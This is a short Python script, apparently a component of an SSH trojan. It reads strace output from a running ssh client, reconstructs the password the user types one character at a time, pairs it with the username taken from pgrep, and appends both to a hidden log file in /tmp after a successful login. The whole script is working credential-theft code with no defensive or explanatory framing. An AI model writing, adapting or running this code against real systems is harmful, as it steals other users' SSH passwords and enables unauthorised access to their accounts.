import re
import subprocess

pattern = r'read\(5,\s*"(.)"\s*,\s*\d+\)'
pattern_username = r'ssh\s+(\S+)@\d+\.\d+\.\d+\.\d+'

result = subprocess.run(["pgrep", "-a", "ssh"], capture_output=True, text=True)

matches = re.findall(pattern_username, result.stdout)

username = matches[0] if matches else ''

with open("/tmp/strace_output.txt", "r", encoding="utf-8") as file:
    s = ''
    for line in file:
        if "read(5," in line:
            match = re.search(pattern, line)
            if match:
                s = s + match.group(1)
        elif "Permission denied, please try again." in line:
            s = ''
        elif "Last login:" in line:
            print(s)
            with open("/tmp/.log_sshtrojan2.txt", "a") as log_file:
                log_file.write(f"Username: {username}\nPassword: {s[:len(s)]}\n\n")

